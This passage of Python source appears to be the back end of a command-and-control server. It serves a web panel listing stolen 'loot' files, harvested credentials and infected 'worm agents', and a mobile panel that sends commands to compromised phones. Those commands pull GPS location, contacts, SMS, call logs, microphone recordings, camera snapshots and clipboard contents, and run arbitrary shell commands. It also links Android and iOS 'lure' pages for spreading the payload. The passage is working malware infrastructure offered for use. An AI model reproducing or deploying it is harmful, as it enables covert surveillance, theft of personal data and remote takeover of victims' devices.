                fp=os.path.join(LOOT_DIR,f); sz=os.path.getsize(fp)
                img=""
                if f.lower().endswith((".png",".jpg",".jpeg")):
                    img=f"<img src='/loot/dl/{f}' loading='lazy'>"
                lg+=(f"<div class='lc'>{img}<div class='lf'>{f}</div><div class='ls'>{sz//1024}KB</div>"
                     f"<a class='qa' href='/loot/dl/{f}' download>⬇ dl</a> "
                     f"<a class='qa r' href='/loot/delete?f={f}' onclick='return confirm(\"Delete?\")'>🗑</a></div>")
        if not lg: lg="<p style='color:var(--sub);padding:20px'>No loot yet.</p>"
        wf=""
        for aid in worm_aids:
            a=agents[aid]; st=a.get("status","?")
            scol="var(--grn)" if st=="ONLINE" else "var(--red)"
            last_out=""
            if aid in agent_resps and agent_resps[aid]:
                last_out=agent_resps[aid][-1].get("resp","")[:300]
            wlog=f"<div class='wl'>{last_out}</div>" if last_out else ""
            wf+=(f"<div class='wc'><span class='wi'>🧬 {aid}</span>"
                 f"<div class='wn'>{a['ip']} · {a['os'][:60]} · {a['hostname']}/{a.get('user','?')}</div>"
                 f"<div class='wn'>Status: <span style='color:{scol}'>{st}</span> · {a['last_seen']}"
                 f" · <a class='qa r' href='/agent/delete?aid={aid}' onclick='return confirm(\"Remove?\")'>remove</a></div>"
                 f"{wlog}</div>")
        if not wf: wf="<p style='color:var(--sub);padding:20px'>No worm agents connected yet.</p>"
        cc=sum(1 for _ in open(CREDS_FILE)) if os.path.exists(CREDS_FILE) else 0
        lc=len(os.listdir(LOOT_DIR)) if os.path.isdir(LOOT_DIR) else 0
        wc=len(worm_aids); ac=len([a for a in agents.values() if a.get("status")=="ONLINE"])
        return HTML_PANEL.format(ac=ac,wc=wc,cc=cc,lc=lc,ts=ts(),ar=rows,ao=opts,
            fa=first,fw=fw,worm_opts=worm_opts,cr=cr,ou=ou,lg=lg,wf=wf)

    def _send(self,body,ct="text/plain",raw=False):
        data=body if raw else (body.encode() if isinstance(body,str) else body)
        self.send_response(200); self.send_header("Content-Type",ct)
        self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
        self.wfile.write(data)
    def _mobile_panel(self):
        rows = ""
        with _lock:
            agents_snap = dict(mobile_agents)
        for sid, a in sorted(agents_snap.items(), key=lambda x: x[1].get("last_seen",""), reverse=True):
            device = a.get("device") or a.get("hostname","?")
            os_    = a.get("os","?")
            ip_    = a.get("ip","?")
            last   = a.get("last_seen","?")
            typ_   = "🤖 Termux" if a.get("termux") else ("📱 Browser" if "browser" in a.get("ua","").lower() else "📱 Agent")
            logf   = os.path.join(MOBILE_DIR, f"{sid}.log")
            recent = ""
            if os.path.exists(logf):
                try:
                    lines = open(logf).readlines()
                    recent = "".join(lines[-5:]).replace("<","&lt;").replace(">","&gt;")
                except: pass
            rows += f"""<div class="magent">
  <div class="mhdr">
    <span class="mtag">{typ_}</span>
    <span class="msid">{sid}</span>
    <span class="mdev">{device}</span>
    <span class="mos">{os_}</span>
    <span class="mip">{ip_}</span>
    <span class="mts">{last}</span>
  </div>
  {f'<pre class="mlog">{recent}</pre>' if recent else ''}
  <div class="mcmds">
    <form method="POST" action="/mobile/sendcmd">
      <input type="hidden" name="sid" value="{sid}">
      <select name="cmd">
        <option value="gps">GPS</option>
        <option value="contacts">Contacts</option>
        <option value="sms">SMS</option>
        <option value="calls">Call Log</option>
        <option value="mic">Record Mic (10s)</option>
        <option value="camera">Camera Snap</option>
        <option value="clipboard">Clipboard</option>
        <option value="wifi">WiFi Info</option>
        <option value="info">Device Info</option>
        <option value="ls">List Files</option>
      </select>
      <button type="submit">Send</button>
    </form>
    <form method="POST" action="/mobile/sendcmd" style="display:inline">
      <input type="hidden" name="sid" value="{sid}">
      <input type="hidden" name="cmd" value="shell">
      <input name="args" placeholder="shell command..." style="width:200px">
      <button type="submit">Exec</button>
    </form>
  </div>
</div>"""
        if not rows:
            rows = "<p style='color:#666;padding:20px'>No mobile agents connected yet.<br>Deploy a payload via <b>start mobile</b></p>"
        return f"""<!DOCTYPE html><html><head>
<meta charset="UTF-8"><title>Mobile Agents</title>
<style>
body{{background:#111;color:#eee;font-family:monospace;padding:20px}}
h2{{color:#4af;margin-bottom:16px}}
.magent{{background:#1e1e1e;border:1px solid #333;border-radius:8px;padding:14px;margin-bottom:12px}}
.mhdr{{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:8px;align-items:center}}
.mtag{{background:#1a6e3a;color:#7dff9c;padding:2px 8px;border-radius:4px;font-size:12px}}
.msid{{color:#aaa;font-size:12px}}
.mdev{{color:#fff;font-weight:bold}}
.mos,.mip,.mts{{color:#888;font-size:12px}}
.mlog{{background:#0a0a0a;padding:8px;border-radius:4px;font-size:11px;color:#9f9;max-height:100px;overflow:auto;margin-bottom:8px;white-space:pre-wrap}}
.mcmds select,.mcmds input{{background:#2a2a2a;color:#eee;border:1px solid #444;padding:4px 8px;border-radius:4px}}
.mcmds button{{background:#1a73e8;color:white;border:none;padding:4px 12px;border-radius:4px;cursor:pointer;margin-left:4px}}
.back{{color:#4af;text-decoration:none;display:inline-block;margin-bottom:16px}}
</style></head><body>
<a class="back" href="/panel">← Panel</a>
<h2>📱 Mobile Agents ({len(agents_snap)})</h2>
<p style="color:#888;font-size:12px;margin-bottom:16px">
  Android lure: <a href="/m/android-lure" style="color:#4af">/m/android-lure</a> &nbsp;|&nbsp;
  iOS lure: <a href="/m/ios-lure" style="color:#4af">/m/ios-lure</a> &nbsp;|&nbsp;
  Loot: <a href="/loot" style="color:#4af">/loot</a>
</p>
{rows}
</body></html>"""

    def _json(self, obj, code=200):
        import json as _json
        data = _json.dumps(obj, indent=2).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(data))
        self._cors(); self.end_headers()
        self.wfile.write(data)
    def _html(self,body):
        data=body.encode() if isinstance(body,str) else body
        self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",len(data)); self.end_headers()
        self.wfile.write(data)
    def _redir(self,path="/panel"):
        self.send_response(302); self.send_header("Location",path); self.end_headers()

if __name__=="__main__":
    threading.Thread(target=agent_listener,daemon=True).start()
    httpd=HTTPServer(("0.0.0.0",C2_PORT),H)
    scheme="http"
    if USE_TLS:
        cert,key=_gen_cert()
        if cert and key:
            ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert,key)
            httpd.socket=ctx.wrap_socket(httpd.socket,server_side=True)
            scheme="https"
            log("[TLS] Certificate loaded — HTTPS enabled")
        else:
            log("[TLS] cert generation failed — falling back to HTTP")
    log(f"[*] Panel  → {scheme}://0.0.0.0:{C2_PORT}/panel")
    log(f"[*] TCP :4444 | Loot → {LOOT_DIR}")
    log(f"[*] Portal → {scheme}://0.0.0.0:{C2_PORT}/banner")
    httpd.serve_forever()

